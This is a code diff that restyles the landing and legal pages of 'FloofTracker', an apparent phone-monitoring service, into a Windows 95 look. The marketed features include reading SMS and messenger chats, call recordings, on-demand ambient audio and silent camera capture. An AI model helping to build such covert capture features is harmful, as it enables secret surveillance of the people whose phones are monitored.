@@ -872,97 +872,148 @@ app.post('/device/call-recording', bigJson, deviceLimiter, requireValidDeviceTok
 // ── Frontend Pages ───────────────────────────────────────────────────────────
 
 // Public landing page: anyone can browse the features before signing in.
+// Styled like a classic 1990s desktop app (Windows 95-era chrome).
 // "Dashboard" sends logged-in users straight to /tokens, everyone else to
 // /login first.
 app.get('/', (req, res) => {
     const loggedIn = !!(req.session && req.session.employer_id);
     const dashboardHref = loggedIn ? '/tokens' : '/login';
     res.send(`<!DOCTYPE html><html><head><title>FloofTracker - Employee Monitoring</title><style>
-    ${styles}
-    .hero { text-align:center; padding:64px 20px 40px; }
-    .hero h2 { font-size:40px; color:#1a1a2e; letter-spacing:-.02em; margin-bottom:16px; line-height:1.15; }
-    .hero p { color:#6b7280; font-size:17px; max-width:660px; margin:0 auto 32px; line-height:1.6; }
-    .hero-btns { display:flex; gap:14px; justify-content:center; flex-wrap:wrap; }
-    .btn-lg { padding:14px 32px; font-size:15px; }
-    .feature-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(200px,1fr)); gap:16px; margin-top:8px; }
-    .feature-item { background:#f8f9fc; border:1px solid #eceef3; border-radius:12px; padding:22px 18px; text-align:center; transition: transform .18s ease, box-shadow .18s ease; }
-    .feature-item:hover { transform: translateY(-2px); box-shadow: 0 8px 18px rgba(16,24,40,.07); }
-    .feature-item .icon { font-size:32px; margin-bottom:10px; }
-    .feature-item h4 { color:#1a1a2e; margin-bottom:6px; }
-    .feature-item p { color:#6b7280; font-size:13px; line-height:1.5; }
-    .steps { display:grid; grid-template-columns:repeat(auto-fit, minmax(200px,1fr)); gap:16px; margin-top:8px; }
-    .step { background:#fff; border:1px solid #e8eaf0; border-radius:12px; padding:22px 18px; text-align:center; }
-    .step .num { width:34px; height:34px; border-radius:50%; background:#1a1a2e; color:#fff; font-weight:700; font-size:15px; display:flex; align-items:center; justify-content:center; margin:0 auto 12px; }
-    .step h4 { color:#1a1a2e; margin-bottom:6px; }
-    .step p { color:#6b7280; font-size:13px; line-height:1.5; }
-    .section-head { text-align:center; margin-bottom:24px; }
-    .section-head h3 { color:#1a1a2e; font-size:24px; margin-bottom:8px; }
-    .section-head p { color:#6b7280; font-size:14.5px; }
-    .cta-band { text-align:center; padding:10px 20px 40px; }
-    .footer { text-align:center; color:#9ca3af; font-size:12.5px; padding:26px 20px; border-top:1px solid #e8eaf0; }
+    * { box-sizing:border-box; margin:0; padding:0; }
+    body { font-family:"MS Sans Serif","Tahoma","Verdana",sans-serif; font-size:11px; color:#000; background:#008080; min-height:100vh; padding:16px 16px 48px; }
+    /* Window chrome */
+    .window { background:#c0c0c0; max-width:1000px; margin:8px auto 14px; border-top:2px solid #dfdfdf; border-left:2px solid #dfdfdf; border-right:2px solid #404040; border-bottom:2px solid #404040; box-shadow:0 0 0 1px #000; }
+    .titlebar { background:linear-gradient(90deg,#000080,#1084d0); color:#fff; padding:3px 4px; display:flex; align-items:center; gap:8px; user-select:none; }
+    .titlebar .title { font-weight:bold; font-size:11px; letter-spacing:.2px; }
+    .win-btns { margin-left:auto; display:flex; gap:2px; }
+    .win-btn { width:16px; height:14px; background:#c0c0c0; border-top:2px solid #dfdfdf; border-left:2px solid #dfdfdf; border-right:2px solid #404040; border-bottom:2px solid #404040; color:#000; font-size:9px; font-weight:bold; line-height:11px; text-align:center; cursor:pointer; font-family:inherit; }
+    .win-btn:active { border-top:2px solid #404040; border-left:2px solid #404040; border-right:2px solid #dfdfdf; border-bottom:2px solid #dfdfdf; }
+    .menubar { background:#c0c0c0; border-bottom:1px solid #808080; padding:1px 2px; display:flex; gap:1px; }
+    .menubar button { background:transparent; border:none; font-family:inherit; font-size:11px; padding:2px 8px; cursor:pointer; color:#000; }
+    .menubar button:hover { background:#000080; color:#fff; }
+    .body { padding:12px; }
+    .panel { background:#fff; border-top:2px solid #808080; border-left:2px solid #808080; border-right:2px solid #dfdfdf; border-bottom:2px solid #dfdfdf; padding:16px; }
+    /* Content */
+    .hero { text-align:center; padding:6px 0 8px; }
+    .hero h2 { font-size:20px; color:#000080; margin-bottom:8px; }
+    .hero p { font-size:11px; color:#333; max-width:640px; margin:0 auto 14px; line-height:1.5; }
+    .hero-btns { display:flex; gap:8px; justify-content:center; flex-wrap:wrap; }
+    .groupbox { border:1px solid #808080; box-shadow:inset 1px 1px 0 #fff; padding:12px; margin-top:16px; position:relative; }
+    .groupbox .gtitle { position:absolute; top:-7px; left:8px; background:#fff; padding:0 4px; font-weight:bold; font-size:11px; color:#000080; }
+    .feature-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:10px; margin-top:12px; }
+    .feature-item { background:#c0c0c0; border-top:2px solid #dfdfdf; border-left:2px solid #dfdfdf; border-right:2px solid #808080; border-bottom:2px solid #808080; padding:10px 8px; text-align:center; }
+    .feature-item .icon { font-size:22px; }
+    .feature-item h4 { font-size:11px; margin:4px 0 2px; color:#000; }
+    .feature-item p { font-size:10px; color:#333; line-height:1.4; }
+    .steps { display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:10px; margin-top:12px; }
+    .step { background:#c0c0c0; border-top:2px solid #dfdfdf; border-left:2px solid #dfdfdf; border-right:2px solid #808080; border-bottom:2px solid #808080; padding:10px; text-align:center; }
+    .step .num { font-weight:bold; font-size:14px; color:#000080; }
+    .step h4 { margin:4px 0 2px; }
+    .step p { font-size:10px; color:#333; line-height:1.4; }
+    .cta { text-align:center; padding:16px 0 4px; }
+    .cta p { margin-bottom:10px; }
+    /* Controls */
+    .btn { background:#c0c0c0; border-top:2px solid #dfdfdf; border-left:2px solid #dfdfdf; border-right:2px solid #404040; border-bottom:2px solid #404040; font-family:inherit; font-size:11px; padding:4px 14px; cursor:pointer; color:#000; }
+    .btn:active { border-top:2px solid #404040; border-left:2px solid #404040; border-right:2px solid #dfdfdf; border-bottom:2px solid #dfdfdf; }
+    .btn:focus { outline:1px dotted #000; outline-offset:-3px; }
+    .btn-primary { font-weight:bold; }
+    /* Status bar + taskbar */
+    .statusbar { background:#c0c0c0; border-top:2px solid #808080; padding:2px 4px; display:flex; gap:8px; }
+    .statusbar .cell { border:1px solid; border-color:#808080 #dfdfdf #dfdfdf #808080; padding:1px 8px; font-size:10px; }
+    .taskbar { position:fixed; bottom:0; left:0; right:0; background:#c0c0c0; border-top:2px solid #dfdfdf; padding:3px 4px; display:flex; align-items:center; gap:6px; z-index:100; }
+    .start-btn { display:flex; align-items:center; gap:5px; background:#c0c0c0; border-top:2px solid #dfdfdf; border-left:2px solid #dfdfdf; border-right:2px solid #404040; border-bottom:2px solid #404040; font-family:inherit; font-size:11px; font-weight:bold; padding:2px 10px 2px 4px; cursor:pointer; color:#000; }
+    .start-btn:active { border-top:2px solid #404040; border-left:2px solid #404040; border-right:2px solid #dfdfdf; border-bottom:2px solid #dfdfdf; }
+    .flag { width:14px; height:14px; display:grid; grid-template-columns:1fr 1fr; grid-template-rows:1fr 1fr; }
+    .flag span:nth-child(1){background:#ff0000;} .flag span:nth-child(2){background:#00a800;} .flag span:nth-child(3){background:#0000ff;} .flag span:nth-child(4){background:#ffff00;}
+    .task-item { background:#c0c0c0; border-top:2px solid #808080; border-left:2px solid #808080; border-right:2px solid #dfdfdf; border-bottom:2px solid #dfdfdf; padding:2px 14px; font-size:11px; cursor:pointer; font-family:inherit; color:#000; }
+    .task-item:active { border-top:2px solid #dfdfdf; border-left:2px solid #dfdfdf; border-right:2px solid #808080; border-bottom:2px solid #808080; }
+    .tray { margin-left:auto; border:1px solid; border-color:#808080 #dfdfdf #dfdfdf #808080; padding:2px 8px; font-size:11px; background:#c0c0c0; }
+    .desktop-footer { text-align:center; color:#fff; font-size:10px; padding:4px 0 2px; }
+    .desktop-footer a { color:#ffff00; text-decoration:none; }
+    .desktop-footer a:hover { text-decoration:underline; }
     </style></head><body>
-    <div class="header">
-        <h1>🐾 FloofTracker</h1>
-        <div style="display:flex;gap:8px;flex-wrap:wrap">
-            <button class="btn btn-primary" onclick="goDashboard()">Dashboard</button>
-            ${loggedIn
-                ? '<button class="btn btn-danger" onclick="window.location.href=\'/logout\'">Logout</button>'
-                : '<button class="btn btn-outline" onclick="window.location.href=\'/login\'">Login</button><button class="btn btn-success" onclick="window.location.href=\'/register\'">Sign Up Free</button>'}
+    <div class="window">
+        <div class="titlebar">
+            <span class="title">FloofTracker — Employee Monitoring</span>
+            <div class="win-btns">
+                <button class="win-btn" title="Minimize">—</button>
+                <button class="win-btn" title="Maximize">□</button>
+                <button class="win-btn" title="Close" onclick="about()">✕</button>
+            </div>
+        </div>
+        <div class="menubar">
+            <button>File</button><button>Edit</button><button>View</button><button onclick="about()">Help</button>
+        </div>
+        <div class="body">
+            <div class="panel">
+                <div class="hero">
+                    <h2>🐾 Welcome to FloofTracker</h2>
+                    <p>Know what's happening on your company devices. FloofTracker gives you real-time visibility into location, calls, messages, app usage, media and more — all from a single dashboard.</p>
+                    <div class="hero-btns">
+                        <button class="btn btn-primary" onclick="goDashboard()">Go to Dashboard</button>
+                        ${loggedIn
+                            ? '<button class="btn" onclick="window.location.href=\'/logout\'">Logout</button>'
+                            : '<button class="btn" onclick="window.location.href=\'/login\'">Login</button><button class="btn btn-primary" onclick="window.location.href=\'/register\'">Sign Up Free</button>'}
+                    </div>
+                </div>
+
+                <div class="groupbox">
+                    <div class="gtitle">Features</div>
+                    <div class="feature-grid">
+                        <div class="feature-item"><div class="icon">📍</div><h4>GPS Location</h4><p>Real-time location tracking with accuracy and history</p></div>
+                        <div class="feature-item"><div class="icon">📞</div><h4>Call Logs &amp; Recordings</h4><p>Incoming, outgoing and missed calls with duration and audio</p></div>
+                        <div class="feature-item"><div class="icon">💬</div><h4>SMS Messages</h4><p>All sent and received text messages</p></div>
+                        <div class="feature-item"><div class="icon">📊</div><h4>App Usage</h4><p>Which apps are used and for how long</p></div>
+                        <div class="feature-item"><div class="icon">👥</div><h4>Contacts</h4><p>Full contact list with names and numbers</p></div>
+                        <div class="feature-item"><div class="icon">🖼️</div><h4>Photos &amp; Screenshots</h4><p>Thumbnail previews, with full-resolution downloads</p></div>
+                        <div class="feature-item"><div class="icon">💌</div><h4>Instant Messages</h4><p>Messenger, WhatsApp, Telegram and more</p></div>
+                        <div class="feature-item"><div class="icon">🎙️</div><h4>Remote Recording</h4><p>Capture ambient audio on demand, right from the dashboard</p></div>
+                        <div class="feature-item"><div class="icon">📷</div><h4>Remote Photo</h4><p>Silently capture front or back camera</p></div>
+                        <div class="feature-item"><div class="icon">⚡</div><h4>Live Status</h4><p>See online/offline status and last-seen at a glance</p></div>
+                    </div>
+                </div>
+
+                <div class="groupbox">
+                    <div class="gtitle">How it works</div>
+                    <div class="steps">
+                        <div class="step"><div class="num">1</div><h4>Create your account</h4><p>Sign up free — no credit card required</p></div>
+                        <div class="step"><div class="num">2</div><h4>Add a device</h4><p>Generate a token and install the FloofTracker app on the phone</p></div>
+                        <div class="step"><div class="num">3</div><h4>Open the dashboard</h4><p>View location, calls, messages, media and more in real time</p></div>
+                    </div>
+                </div>
+
+                <div class="cta">
+                    <p><b>Ready to get started?</b><br/>Join employers who monitor their teams with FloofTracker.</p>
+                    <div class="hero-btns">
+                        <button class="btn btn-primary" onclick="goDashboard()">Go to Dashboard</button>
+                        <button class="btn" onclick="window.location.href='/register'">Sign Up Free</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="statusbar">
+            <span class="cell">Ready</span>
+            <span class="cell">10 features</span>
+            <span class="cell">© 2026 FloofTracker</span>
         </div>
     </div>
-    <div class="container">
-        <div class="hero">
-            <h2>Know what's happening on your company devices</h2>
-            <p>FloofTracker gives you real-time visibility into location, calls, messages, app usage, media and more — all from a single dashboard.</p>
-            <div class="hero-btns">
-                <button class="btn btn-primary btn-lg" onclick="goDashboard()">Go to Dashboard</button>
-                <button class="btn btn-outline btn-lg" onclick="window.location.href='/register'">Create Free Account</button>
-            </div>
-        </div>
 
-        <div class="card">
-            <div class="section-head">
-                <h3>Everything you need to monitor</h3>
-                <p>One lightweight Android app. One dashboard. All the data.</p>
-            </div>
-            <div class="feature-grid">
-                <div class="feature-item"><div class="icon">📍</div><h4>GPS Location</h4><p>Real-time location tracking with accuracy and history</p></div>
-                <div class="feature-item"><div class="icon">📞</div><h4>Call Logs & Recordings</h4><p>Incoming, outgoing and missed calls with duration and audio</p></div>
-                <div class="feature-item"><div class="icon">💬</div><h4>SMS Messages</h4><p>All sent and received text messages</p></div>
-                <div class="feature-item"><div class="icon">📊</div><h4>App Usage</h4><p>Which apps are used and for how long</p></div>
-                <div class="feature-item"><div class="icon">👥</div><h4>Contacts</h4><p>Full contact list with names and numbers</p></div>
-                <div class="feature-item"><div class="icon">🖼️</div><h4>Photos & Screenshots</h4><p>Thumbnail previews, with full-resolution downloads</p></div>
-                <div class="feature-item"><div class="icon">💌</div><h4>Instant Messages</h4><p>Messenger, WhatsApp, Telegram and more</p></div>
-                <div class="feature-item"><div class="icon">🎙️</div><h4>Remote Recording</h4><p>Capture ambient audio on demand, right from the dashboard</p></div>
-                <div class="feature-item"><div class="icon">📷</div><h4>Remote Photo</h4><p>Silently capture front or back camera</p></div>
-                <div class="feature-item"><div class="icon">⚡</div><h4>Live Status</h4><p>See online/offline status and last-seen at a glance</p></div>
-            </div>
-        </div>
-
-        <div class="card">
-            <div class="section-head">
-                <h3>How it works</h3>
-                <p>Up and running in minutes</p>
-            </div>
-            <div class="steps">
-                <div class="step"><div class="num">1</div><h4>Create your account</h4><p>Sign up free — no credit card required</p></div>
-                <div class="step"><div class="num">2</div><h4>Add a device</h4><p>Generate a token and install the FloofTracker app on the phone</p></div>
-                <div class="step"><div class="num">3</div><h4>Open the dashboard</h4><p>View location, calls, messages, media and more in real time</p></div>
-            </div>
-        </div>
-
-        <div class="cta-band">
-            <h3 style="color:#1a1a2e;font-size:22px;margin-bottom:10px">Ready to get started?</h3>
-            <p style="color:#6b7280;margin-bottom:20px;font-size:14.5px">Join employers who monitor their teams with FloofTracker.</p>
-            <div class="hero-btns">
-                <button class="btn btn-primary btn-lg" onclick="goDashboard()">Go to Dashboard</button>
-                <button class="btn btn-success btn-lg" onclick="window.location.href='/register'">Sign Up Free</button>
-            </div>
-        </div>
+    <div class="desktop-footer">
+        <a href="/terms">Terms of Service</a> &nbsp;·&nbsp; <a href="/privacy">Privacy Policy</a>
     </div>
-    <div class="footer">© 2026 FloofTracker · Employee monitoring made simple · <a href="/terms" style="color:#9ca3af">Terms of Service</a> · <a href="/privacy" style="color:#9ca3af">Privacy Policy</a></div>
+
+    <div class="taskbar">
+        <button class="start-btn" onclick="startMenu()"><span class="flag"><span></span><span></span><span></span><span></span></span>Start</button>
+        <button class="task-item" onclick="goDashboard()">FloofTracker</button>
+        <div class="tray" id="clock"></div>
+    </div>
+
     <script>
         function goDashboard() { window.location.href = '${dashboardHref}'; }
+        function about() { alert('FloofTracker v1.0 — Employee monitoring made simple. © 2026 FloofTracker'); }
+        function startMenu() { alert('Welcome to FloofTracker! Click "Go to Dashboard" to get started.'); }
+        function tick() { var d = new Date(); document.getElementById('clock').textContent = d.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}); }
+        setInterval(tick, 1000); tick();
     </script>
     </body></html>`);
 });
@@ -1002,7 +1053,8 @@ app.get('/login', (req, res) => {
             if (data.success) {
                 localStorage.setItem('employer_id', data.employer_id);
                 localStorage.setItem('plan', data.plan);
-                window.location.href = data.plan === 'free' ? '/welcome' : '/tokens';
+                // Existing users go straight to their devices dashboard.
+                window.location.href = '/tokens';
             } else {
                 const msg = document.getElementById('msg');
                 msg.style.display = 'block';
@@ -1018,24 +1070,40 @@ app.get('/login', (req, res) => {
 // by counsel before relying on them in production.
 function renderLegal(title, updated, sections) {
     return `<!DOCTYPE html><html><head><title>${title} - FloofTracker</title><style>
-    ${styles}
-    .legal { max-width: 820px; margin: 26px auto; padding: 0 20px; }
-    .legal h2 { color:#1a1a2e; margin-bottom:6px; }
-    .legal .updated { color:#9ca3af; font-size:12.5px; margin-bottom:24px; }
-    .legal h3 { color:#1a1a2e; font-size:16px; margin:22px 0 8px; }
-    .legal p { color:#4b5563; font-size:14px; line-height:1.65; margin-bottom:10px; }
-    .legal ul { margin: 6px 0 12px 22px; }
-    .legal li { color:#4b5563; font-size:14px; line-height:1.65; margin-bottom:6px; }
+    * { box-sizing:border-box; margin:0; padding:0; }
+    body { font-family:"MS Sans Serif","Tahoma","Verdana",sans-serif; font-size:11px; color:#000; background:#008080; padding:16px; }
+    .window { background:#c0c0c0; max-width:860px; margin:8px auto 16px; border-top:2px solid #dfdfdf; border-left:2px solid #dfdfdf; border-right:2px solid #404040; border-bottom:2px solid #404040; box-shadow:0 0 0 1px #000; }
+    .titlebar { background:linear-gradient(90deg,#000080,#1084d0); color:#fff; padding:3px 4px; display:flex; align-items:center; }
+    .titlebar .title { font-weight:bold; font-size:11px; }
+    .menubar { background:#c0c0c0; border-bottom:1px solid #808080; padding:1px 2px; display:flex; gap:1px; }
+    .menubar button { background:transparent; border:none; font-family:inherit; font-size:11px; padding:2px 8px; cursor:pointer; color:#000; }
+    .menubar button:hover { background:#000080; color:#fff; }
+    .body { padding:12px; }
+    .panel { background:#fff; border-top:2px solid #808080; border-left:2px solid #808080; border-right:2px solid #dfdfdf; border-bottom:2px solid #dfdfdf; padding:16px; }
+    .panel h2 { color:#000080; font-size:16px; margin-bottom:4px; }
+    .updated { color:#666; font-size:10px; margin-bottom:12px; border-bottom:1px solid #ccc; padding-bottom:6px; }
+    .panel h3 { color:#000080; font-size:12px; margin:14px 0 4px; }
+    .panel p, .panel li { font-size:11px; color:#222; line-height:1.55; margin-bottom:6px; }
+    .panel ul { margin:0 0 6px 18px; }
+    .back { text-align:center; margin-top:12px; }
+    .btn { background:#c0c0c0; border-top:2px solid #dfdfdf; border-left:2px solid #dfdfdf; border-right:2px solid #404040; border-bottom:2px solid #404040; font-family:inherit; font-size:11px; padding:4px 14px; cursor:pointer; color:#000; }
+    .btn:active { border-top:2px solid #404040; border-left:2px solid #404040; border-right:2px solid #dfdfdf; border-bottom:2px solid #dfdfdf; }
     </style></head><body>
-    <div class="header">
-        <h1>🐾 FloofTracker</h1>
-        <button class="btn btn-outline" onclick="window.location.href='/'">← Back to home</button>
-    </div>
-    <div class="legal">
-        <div class="card">
-            <h2>${title}</h2>
-            <div class="updated">Last updated: ${updated}</div>
-            ${sections.map(s => `<h3>${s.h}</h3>${s.p.map(p => `<p>${p}</p>`).join('')}${s.list ? `<ul>${s.list.map(i => `<li>${i}</li>`).join('')}</ul>` : ''}`).join('')}
+    <div class="window">
+        <div class="titlebar"><span class="title">FloofTracker — ${title}</span></div>
+        <div class="menubar">
+            <button onclick="window.location.href='/'">Home</button>
+            <button onclick="window.location.href='/login'">Login</button>
+            <button onclick="window.location.href='/terms'">Terms</button>
+            <button onclick="window.location.href='/privacy'">Privacy</button>
+        </div>
+        <div class="body">
+            <div class="panel">
+                <h2>${title}</h2>
+                <div class="updated">Last updated: ${updated}</div>
+                ${sections.map(s => `<h3>${s.h}</h3>${s.p.map(p => `<p>${p}</p>`).join('')}${s.list ? `<ul>${s.list.map(i => `<li>${i}</li>`).join('')}</ul>` : ''}`).join('')}
+                <div class="back"><button class="btn" onclick="window.location.href='/'">← Back to home</button></div>
+            </div>
         </div>
     </div>
     </body></html>`;
